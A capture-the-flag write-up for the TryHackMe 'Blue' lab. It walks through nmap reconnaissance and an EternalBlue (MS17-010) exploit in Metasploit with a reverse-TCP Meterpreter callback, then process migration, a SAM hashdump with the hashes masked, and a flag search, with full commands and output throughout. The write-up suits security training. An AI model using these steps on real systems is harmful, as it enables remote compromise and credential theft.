# [Blue](https://tryhackme.com/room/blue)

`Machine's IP - 10.10.145.173`

# Reconnaissance and Discovery
So, the first thing was to start out with a simple nmap scan and outputting the results to a log file.

`nmap -sS -sC -sV 10.10.145.173 > nmap-blue.log`

# Analyzing Information and Risks


```
Nmap scan report for 10.10.145.173
Host is up (0.17s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2020-11-21T23:55:26
|_Not valid after:  2021-05-23T23:55:26
|_ssl-date: 2020-11-23T00:09:50+00:00; -1s from scanner time.
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h29m59s, deviation: 3h00m00s, median: 0s
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:0e:34:55:e8:d9 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-11-22T18:09:45-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-11-23T00:09:45
|_  start_date: 2020-11-22T23:55:25

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.74 seconds
```

So, the in all the text that `Nmap` outputted to me I noticied that `SMB` or [Server Message Block](https://en.wikipedia.org/wiki/Server_Message_Block) was being somewhat enumerated. With a quick search I found out that Nmap had a default script for scanning called [smb-vuln-ms17-010](https://nmap.org/nsedoc/scripts/smb-vuln-ms17-010.html). With the following command:

`nmap -sS 10.10.145.173 -p135,136,139,445 --script=smb-vuln-ms17-010 > nmap-blue-smb.log`

I was able to determine that this machine was vulnerable to MS17-010.

```
Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
```

Then, I opened `msfconsole`

```
┌─[diracspace@parrot]─[~/Documents/tryhackme/blue]
└──╼ $msfconsole -q
msf6 > search EternalBlue
```

And decided to go with the averaged result option

`exploit/windows/smb/ms17_010_eternalblue`


So, I selected that one and `Metasploit` told me that

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
```
Meaning that I would get a `Meterpreter` prompt right away. I specified the machine's IP and my `OpenVPN` IP and launched the exploit.

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.145.173
rhosts => 10.10.145.173
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 10.6.20.112
lhost => 10.6.20.112
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.6.20.112:4444 
[*] 10.10.145.173:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.145.173:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.145.173:445     - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.145.173:445 - Connecting to target for exploitation.
[+] 10.10.145.173:445 - Connection established for exploitation.
[+] 10.10.145.173:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.145.173:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.145.173:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.145.173:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.145.173:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.145.173:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.145.173:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.145.173:445 - Sending all but last fragment of exploit packet
[*] 10.10.145.173:445 - Starting non-paged pool grooming
[+] 10.10.145.173:445 - Sending SMBv2 buffers
[+] 10.10.145.173:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.145.173:445 - Sending final SMBv2 buffers.
[*] 10.10.145.173:445 - Sending last fragment of exploit packet!
[*] 10.10.145.173:445 - Receiving response from exploit packet
[+] 10.10.145.173:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.145.173:445 - Sending egg to corrupted connection.
[*] 10.10.145.173:445 - Triggering free of corrupted buffer.
[*] Sending stage (200262 bytes) to 10.10.145.173
[*] Meterpreter session 1 opened (10.6.20.112:4444 -> 10.10.145.173:49198) at 2020-11-22 16:18:03 -0800
[+] 10.10.145.173:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.145.173:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.145.173:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter >
```

So, here I decided to first jump inside a shell and found out I'm `NT AUTHORITY\ System` so using `getsystem` would just be a little worthless. what I did do was change my process with

```
meterpreter > migrate -N winlogon.exe
[*] Migrating from 1300 to 656...
[*] Migration completed successfully.
```

Then I dumped the `SAM (Security Account Manager)` password `NLTM` hashes with `hashdump`

```
meterpreter > hashdump
Administrator:500:********************************:********************************:::
Guest:501:********************************:********************************:::
Jon:1000:********************************:********************************:::
```

Finally, I went to go look for the flags. Since we start out in the following directory 

```
meterpreter > shell
Process 1776 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

I knew that something was going to be in the local user directories. Eventually, I did find `flag3.txt` there telling me that the high level admin directories would be a good search. On my way there I found `flag1.txt` and with a quick `windows sam location` on `DuckDuckGo` I was able to find `flag2.txt` thus, finishing the room.

## License
[MIT](https://choosealicense.com/licenses/mit/)